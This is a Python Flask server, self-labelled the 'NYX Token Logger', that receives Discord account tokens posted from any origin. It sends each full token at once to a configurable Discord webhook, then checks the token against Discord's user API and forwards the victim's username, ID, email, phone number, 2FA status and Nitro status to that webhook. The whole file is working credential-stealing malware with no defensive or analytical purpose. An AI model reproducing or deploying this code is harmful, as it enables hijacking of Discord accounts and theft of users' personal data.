from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import threading

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'YOUR_WEBHOOK_HERE')

@app.route('/api/token', methods=['POST'])
def handle_token():
    try:
        data = request.json
        token = data.get('token', '').strip()
        
        print(f"Token received: {token[:30]}...")
        
        # Send token IMMEDIATELY
        send_token_immediately(token)
        
        # Check token in background
        threading.Thread(target=check_and_send_token_info, args=(token,)).start()
        
        return jsonify({'status': 'processing'}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

def send_token_immediately(token):
    """Send JUST the token to Discord immediately"""
    embed = {
        'title': '🔑 TOKEN RECEIVED',
        'color': 0x7289da,
        'description': f'**Token:**\n```{token}```',
        'fields': [
            {'name': 'Length', 'value': str(len(token)), 'inline': True},
            {'name': 'Time', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': True},
            {'name': 'Status', 'value': 'Checking...', 'inline': True}
        ],
        'footer': {'text': 'NYX Token Logger'}
    }
    
    payload = {
        'username': 'Token Receiver',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Token sent immediately")
    except:
        print("✗ Failed to send token")

def check_and_send_token_info(token):
    """Check token with Discord and send results"""
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200:
            user = response.json()
            send_valid_token_info(token, user)
        else:
            send_invalid_token_info(token, f'HTTP {response.status_code}')
            
    except Exception as e:
        send_error_info(token, str(e))

def send_valid_token_info(token, user_data):
    """Send detailed info for valid token"""
    embed = {
        'title': '✅ VALID TOKEN CONFIRMED',
        'color': 0x00ff00,
        'fields': [
            {'name': '👤 Username', 'value': f'{user_data.get("username", "Unknown")}#{user_data.get("discriminator", "0")}', 'inline': True},
            {'name': '🆔 User ID', 'value': user_data.get('id', 'Unknown'), 'inline': True},
            {'name': '📧 Email', 'value': user_data.get('email', 'No email'), 'inline': True},
            {'name': '✅ Verified', 'value': 'Yes' if user_data.get('verified') else 'No', 'inline': True},
            {'name': '💎 Nitro', 'value': 'Yes' if user_data.get('premium_type') else 'No', 'inline': True},
            {'name': '🔐 2FA', 'value': 'Enabled' if user_data.get('mfa_enabled') else 'Disabled', 'inline': True},
            {'name': '🌍 Locale', 'value': user_data.get('locale', 'Unknown'), 'inline': True},
            {'name': '📱 Phone', 'value': user_data.get('phone', 'No phone'), 'inline': True},
            {'name': '⏰ Checked At', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': False}
        ],
        'footer': {'text': 'Token verified successfully'}
    }
    
    if user_data.get('avatar'):
        embed['thumbnail'] = {'url': f'https://cdn.discordapp.com/avatars/{user_data["id"]}/{user_data["avatar"]}.png'}
    
    payload = {
        'username': 'Token Validator',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Valid token info sent")
    except:
        print("✗ Failed to send valid token info")

def send_invalid_token_info(token, error_msg):
    """Send info for invalid token"""
    embed = {
        'title': '❌ TOKEN INVALID',
        'color': 0xff0000,
        'description': f'Token check failed',
        'fields': [
            {'name': 'Error', 'value': error_msg, 'inline': False},
            {'name': 'Token Preview', 'value': f'```{token[:30]}...```', 'inline': False},
            {'name': 'Checked At', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': False}
        ],
        'footer': {'text': 'Token validation failed'}
    }
    
    payload = {
        'username': 'Token Validator',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Invalid token info sent")
    except:
        print("✗ Failed to send invalid token info")

def send_error_info(token, error_msg):
    """Send error info"""
    embed = {
        'title': '⚠️ CHECK ERROR',
        'color': 0xffaa00,
        'description': f'Error checking token',
        'fields': [
            {'name': 'Error', 'value': error_msg, 'inline': False},
            {'name': 'Token', 'value': f'```{token[:30]}...```', 'inline': False}
        ]
    }
    
    payload = {
        'username': 'Token Validator - Error',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

@app.route('/')
def home():
    return jsonify({'status': 'running'})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
